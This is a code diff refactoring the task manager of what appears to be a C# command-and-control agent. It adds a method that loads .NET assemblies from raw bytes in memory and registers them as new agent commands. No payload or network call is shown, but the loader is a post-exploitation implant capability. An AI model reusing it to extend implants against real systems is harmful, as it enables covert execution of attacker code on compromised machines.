@@ -10,11 +10,13 @@ using ApolloInterop.Enums.ApolloEnums;
 using ApolloInterop.Classes;
 using System.Threading;
 using ThreadingTask = System.Threading.Tasks.Task;
-using AT = Tasks;
 using System.Reflection;
+using System.Security;
+using System.Security.Permissions;
 
 namespace Apollo.Management.Tasks
 {
+
     internal struct TaskInformation {
         Task Task;
         CancellationToken Token;
@@ -36,35 +38,25 @@ namespace Apollo.Management.Tasks
 
         private ConcurrentDictionary<string, Tasking> _runningTasks = new ConcurrentDictionary<string, Tasking>();
 
+        private ConcurrentDictionary<string, Type> _loadedTaskTypes = new ConcurrentDictionary<string, Type>();
+
         private ConcurrentQueue<Task> TaskQueue = new ConcurrentQueue<Task>();
         private ConcurrentQueue<TaskStatus> TaskStatusQueue = new ConcurrentQueue<TaskStatus>();
         private Action _taskConsumerAction;
         private ThreadingTask _mainworker;
         private Assembly _tasksAsm = null;
+
         public TaskManager(IAgent agent)
         {
             _agent = agent;
-            AT.Initializer.New();
-            foreach(var asm in Assembly.GetExecutingAssembly().GetReferencedAssemblies())
-            {
-                if (asm.Name == "Tasks")
-                {
-                    _tasksAsm = Assembly.Load(asm);
-                    break;
-                }
-            }
-            if (_tasksAsm == null)
-            {
-                throw new Exception("Could not find loaded tasks assembly.");
-            }
+            InitializeTaskLibrary();
             _taskConsumerAction = () =>
             {
                 while(_agent.IsAlive())
                 {
                     if (TaskQueue.TryDequeue(out Task result))
                     {
-                        Type taskType = _tasksAsm.GetType($"Tasks.{result.Command}");
-                        if (taskType == null)
+                        if (!_loadedTaskTypes.ContainsKey(result.Command))
                         {
                             AddTaskResponseToQueue(new TaskResponse()
                             {
@@ -73,9 +65,12 @@ namespace Apollo.Management.Tasks
                                 Completed = true,
                                 Status = "error"
                             });
-                        } else
+                        }
+                        else
                         {
-                            Tasking t = (Tasking)Activator.CreateInstance(taskType, new object[] { _agent, result });
+                            Tasking t = (Tasking)Activator.CreateInstance(
+                                _loadedTaskTypes[result.Command],
+                                new object[] { _agent, result });
                             var taskObj = t.CreateTasking();
                             // When the task finishes, we remove it from the queue.
                             taskObj.ContinueWith((_) =>
@@ -102,6 +97,48 @@ namespace Apollo.Management.Tasks
             };
             _mainworker = new ThreadingTask(_taskConsumerAction);
             _mainworker.Start();
+        }
+
+        private void InitializeTaskLibrary()
+        {
+            _tasksAsm = Assembly.Load("Tasks, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null");
+            if (_tasksAsm == null)
+            {
+                throw new Exception("Could not find loaded tasks assembly.");
+            }
+            foreach(Type t in _tasksAsm.GetTypes())
+            {
+                if (t.FullName.StartsWith("Tasks.") &&
+                    t.IsPublic &&
+                    t.IsClass &&
+                    t.IsVisible)
+                {
+                    string commandName = t.FullName.Split('.')[1];
+                    _loadedTaskTypes[commandName] = t;
+                }
+            }
+        }
+
+        public bool LoadTaskModule(byte[] taskAsm, string command)
+        {
+            bool bRet = false;
+            try
+            {
+                Assembly taskingAsm = Assembly.Load(taskAsm);
+                foreach(Type t in taskingAsm.GetExportedTypes())
+                {
+                    if (t.Name == command)
+                    {
+                        _loadedTaskTypes[command] = t;
+                        bRet = true;
+                        break;
+                    }
+                }
+            } catch (Exception ex)
+            {
+                Console.WriteLine($"Failed to load new module. Reason: {ex.Message}");
+            }
+            return bRet;
         }
 
         private void OnTaskErrorOrCancel(Tasking t, System.Threading.Tasks.Task taskObj)
